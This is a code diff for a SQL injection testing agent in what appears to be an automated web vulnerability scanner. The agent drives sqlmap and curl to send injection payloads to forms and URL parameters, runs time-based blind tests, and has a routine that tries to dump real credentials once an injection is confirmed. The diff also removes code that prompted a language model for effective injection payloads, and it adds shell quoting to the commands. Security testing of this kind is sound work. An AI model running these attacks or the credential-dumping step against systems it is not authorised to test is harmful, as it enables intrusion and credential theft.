@@ -9,25 +9,16 @@ Tests for SQL injection vulnerabilities:
   - Union-based injection attempts
 """
 
-import sys
-import os
+import re
+import shlex
 from urllib.parse import quote
-import json
 
-# Ensure backend root is in path to import reasoning
-sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))
-
-from deep_agent import DeepAgent
+from agents.base_agent import BaseAgent
 from models.scan import ScanContext, Vuln
 from models.agent_result import AgentResult
-from reasoning.oracle_adapter import get_reasoner
-from config import config
 
 
-class SQLiAgent(DeepAgent):
-    agent_id = "agent_03_sqli"
-    target_cwe = "CWE-89"
-    attack_category = "injection"
+class SQLiAgent(BaseAgent):
 
     SQLI_PAYLOADS = [
         # Auth bypass
@@ -74,46 +65,33 @@ class SQLiAgent(DeepAgent):
         r"org\.postgresql\.util\.PSQLException",
     ]
 
-    async def _execute_attack(self, context: ScanContext, prior_knowledge: list[dict]) -> None:
-        await self.log("=== SQL INJECTION TESTING (ORACLE) ===", "info")
+    @staticmethod
+    def _q(value: str) -> str:
+        """Shell-quote untrusted values before embedding in terminal commands."""
+        return shlex.quote(str(value))
 
-        # Dynamically generate payloads via OracleAdapter and Cognee prior_knowledge
-        framework = context.framework or "Unknown"
-        db = context.database or "Unknown"
-        pk_str = json.dumps(prior_knowledge)[:500] if prior_knowledge else "None"
-        prompt = (f"Target framework: {framework}, Database: {db}. Prior knowledge: {pk_str}. "
-                  f"Provide a JSON array of 5 highly effective SQL injection payloads for auth bypass, error-based, and union-based extraction. "
-                  f"Respond ONLY in JSON. Format: [{{\"payload\": \"...\", \"type\": \"...\"}}]")
-        
-        reasoner = get_reasoner()
-        result = reasoner.generate(model=config.OLLAMA_MODEL, prompt=prompt, task_type="complex_fix", cwe=self.target_cwe)
-        dynamic_payloads = self._parse_json(result.response)
-        
-        if not dynamic_payloads or not isinstance(dynamic_payloads, list):
-            await self.log("Oracle fallback to static payload list", "warning")
-            dynamic_payloads = [{"payload": p, "type": t} for p, t in self.SQLI_PAYLOADS]
-        else:
-            await self.log(f"Oracle generated {len(dynamic_payloads)} dynamic payloads", "success")
+    async def run(self, context: ScanContext) -> AgentResult:
+        await self.log("═══ SQL INJECTION TESTING ═══", "info")
 
-        # --- 1. Test sqlmap if available ---
+        # ─── 1. Test sqlmap if available ───
         has_sqlmap = await self.terminal.check_tool("sqlmap")
         if has_sqlmap:
             await self._run_sqlmap(context)
 
-        # --- 2. Manual payload testing on all forms ---
-        await self.log("Testing forms with payloads...", "info")
+        # ─── 2. Manual payload testing on all forms ───
+        await self.log("Testing forms with manual payloads...", "info")
         for form in context.all_forms:
             if not form.inputs:
                 continue
-            await self._test_form(form, context, dynamic_payloads)
+            await self._test_form(form, context)
 
-        # --- 3. Test URL parameters ---
+        # ─── 3. Test URL parameters ───
         await self.log("Testing URL parameters...", "info")
         for endpoint in context.all_endpoints:
             if "?" in endpoint:
-                await self._test_url_params(endpoint, context, dynamic_payloads)
+                await self._test_url_params(endpoint, context)
 
-        # --- 4. Time-based blind injection on login ---
+        # ─── 4. Time-based blind injection on login ───
         login_forms = [
             f for f in context.all_forms
             if any(inp in ['password', 'passwd', 'pass'] for inp in f.inputs)
@@ -126,17 +104,28 @@ class SQLiAgent(DeepAgent):
             "success" if not self.vulns else "danger",
         )
 
+        return AgentResult(
+            agent="SQLiAgent",
+            vulns=self.vulns,
+            context=context,
+            terminal_logs=self.terminal.command_history,
+        )
+
     async def _run_sqlmap(self, context: ScanContext):
         """Run sqlmap against forms and URL parameters."""
         for form in context.all_forms[:5]:  # Limit to 5 forms
             if form.method.upper() == "POST" and form.inputs:
                 data_str = "&".join(f"{k}=test" for k in form.inputs)
                 await self.log(f"Running sqlmap on {form.action}...", "info")
+                action_q = self._q(form.action)
+                data_q = self._q(data_str)
+                out_dir_q = self._q(f"{self.terminal.working_dir}/sqlmap")
                 out = await self.terminal.run(
-                    f'sqlmap -u "{form.action}" --data="{data_str}" '
+                    f'sqlmap -u {shlex.quote(form.action)} '
+                    f'--data={shlex.quote(data_str)} '
                     f"--batch --level=3 --risk=2 "
                     f"--threads=4 --random-agent "
-                    f"--output-dir={self.terminal.working_dir}/sqlmap",
+                    f"--output-dir={out_dir_q}",
                     timeout=120,
                 )
                 if "injection point" in out.stdout.lower():
@@ -150,17 +139,10 @@ class SQLiAgent(DeepAgent):
                         fix="Use parameterized queries. Never concatenate user input into SQL.",
                     ))
 
-    async def _test_form(self, form, context: ScanContext, dynamic_payloads: list = None):
+    async def _test_form(self, form, context: ScanContext):
         """Test a form with SQL injection payloads."""
         sqli_type = None
-        payloads_to_test = dynamic_payloads or [{"payload": p, "type": t} for p, t in self.SQLI_PAYLOADS]
-        
-        for p_item in payloads_to_test:  # Test ALL payloads
-            payload = p_item.get("payload", "")
-            ptype = p_item.get("type", "unknown")
-            if not payload:
-                continue
-
+        for payload, ptype in self.SQLI_PAYLOADS:  # Test ALL payloads
             # Build form data
             encoded_payload = quote(payload, safe="")
 
@@ -169,11 +151,13 @@ class SQLiAgent(DeepAgent):
                 for inp in form.inputs:
                     data_parts.append(f"{inp}={encoded_payload}")
                 data_str = "&".join(data_parts)
+                action_q = self._q(form.action)
+                data_q = self._q(data_str)
 
                 out = await self.terminal.run(
                     f'curl -s -w "\\n__STATUS__%{{http_code}}" '
-                    f'-X POST "{form.action}" '
-                    f'-d "{data_str}" '
+                    f'-X POST {shlex.quote(form.action)} '
+                    f'-d {shlex.quote(data_str)} '
                     f'--max-time 10'
                 )
             else:
@@ -181,8 +165,9 @@ class SQLiAgent(DeepAgent):
                     f"{inp}={encoded_payload}" for inp in form.inputs
                 )
                 url = f"{form.action}?{params}" if "?" not in form.action else f"{form.action}&{params}"
+                url_q = self._q(url)
                 out = await self.terminal.run(
-                    f'curl -s -w "\\n__STATUS__%{{http_code}}" --max-time 10 "{url}"'
+                    f'curl -s -w "\\n__STATUS__%{{http_code}}" --max-time 10 {shlex.quote(url)}'
                 )
 
             if not out.stdout:
@@ -234,7 +219,7 @@ class SQLiAgent(DeepAgent):
                 sqli_type = sqli_type or "Error-Based (Debug Leak)"
 
             if is_sqli:
-                # -- PROOF: Try to extract real credentials --
+                # ── PROOF: Try to extract real credentials ──
                 dumped = ""
                 dumped = await self._extract_credentials(form, context)
 
@@ -254,8 +239,6 @@ class SQLiAgent(DeepAgent):
                     fix="Use parameterized queries / prepared statements.",
                 ))
                 break  # Found one, move to next form
-            else:
-                self._record_blocked(payload=payload, technique=ptype, response=body[:100])
 
     async def _extract_credentials(self, form, context: ScanContext) -> str:
         """After confirming SQLi, attempt to dump real credentials."""
@@ -278,10 +261,12 @@ class SQLiAgent(DeepAgent):
                 for inp in form.inputs[1:]:
                     data_parts.append(f"{inp}=test")
                 data_str = "&".join(data_parts)
+                action_q = self._q(form.action)
+                data_q = self._q(data_str)
 
                 out = await self.terminal.run(
-                    f'curl -s -X POST "{form.action}" '
-                    f'-d "{data_str}" --max-time 10'
+                    f'curl -s -X POST {shlex.quote(form.action)} '
+                    f'-d {shlex.quote(data_str)} --max-time 10'
                 )
             else:
                 continue
@@ -306,8 +291,11 @@ class SQLiAgent(DeepAgent):
             )
             first_inp = form.inputs[0] if form.inputs else "username"
             data_str = f"{first_inp}={error_payload}"
+            action_q = self._q(form.action)
+            data_q = self._q(data_str)
             out = await self.terminal.run(
-                f'curl -s -X POST "{form.action}" -d "{data_str}" --max-time 10'
+                f'curl -s -X POST {shlex.quote(form.action)} '
+                f'-d {shlex.quote(data_str)} --max-time 10'
             )
             if out.stdout:
                 cred_match = re.search(
@@ -321,21 +309,16 @@ class SQLiAgent(DeepAgent):
 
         return dumped
 
-    async def _test_url_params(self, url: str, context: ScanContext, dynamic_payloads: list = None):
+    async def _test_url_params(self, url: str, context: ScanContext):
         """Test URL parameters for SQL injection."""
-        payloads_to_test = dynamic_payloads or [{"payload": p, "type": t} for p, t in self.SQLI_PAYLOADS]
-        for p_item in payloads_to_test[:5]:
-            payload = p_item.get("payload", "")
-            ptype = p_item.get("type", "unknown")
-            if not payload:
-                continue
-
+        for payload, ptype in self.SQLI_PAYLOADS[:5]:
             encoded = quote(payload, safe="")
             # Replace parameter values with payload
             test_url = re.sub(r'=([^&]*)', f'={encoded}', url)
+            test_url_q = self._q(test_url)
 
             out = await self.terminal.run(
-                f'curl -s --max-time 10 "{test_url}"'
+                f'curl -s --max-time 10 {shlex.quote(test_url)}'
             )
 
             if out.stdout:
@@ -352,9 +335,6 @@ class SQLiAgent(DeepAgent):
                             fix="Use parameterized queries.",
                         ))
                         return
-                
-            if out.stdout:
-                self._record_blocked(payload=payload, technique=ptype, response=out.stdout[:100])
 
     async def _test_time_based(self, form, context: ScanContext):
         """Test for time-based blind SQL injection."""
@@ -362,10 +342,12 @@ class SQLiAgent(DeepAgent):
 
         # First, get baseline response time
         baseline_data = "&".join(f"{inp}=test" for inp in form.inputs)
+        action_q = self._q(form.action)
+        baseline_data_q = self._q(baseline_data)
         baseline = await self.terminal.run(
             f'curl -s -o /dev/null -w "%{{time_total}}" '
-            f'-X POST "{form.action}" '
-            f'-d "{baseline_data}" '
+            f'-X POST {shlex.quote(form.action)} '
+            f'-d {shlex.quote(baseline_data)} '
             f'--max-time 15'
         )
 
@@ -388,10 +370,11 @@ class SQLiAgent(DeepAgent):
         sleep_data = "&".join(
             f"{inp}={encoded_payload}" for inp in form.inputs
         )
+        sleep_data_q = self._q(sleep_data)
         out = await self.terminal.run(
             f'curl -s -o /dev/null -w "%{{time_total}}" '
-            f'-X POST "{form.action}" '
-            f'-d "{sleep_data}" '
+            f'-X POST {shlex.quote(form.action)} '
+            f'-d {shlex.quote(sleep_data)} '
             f'--max-time 15'
         )
 
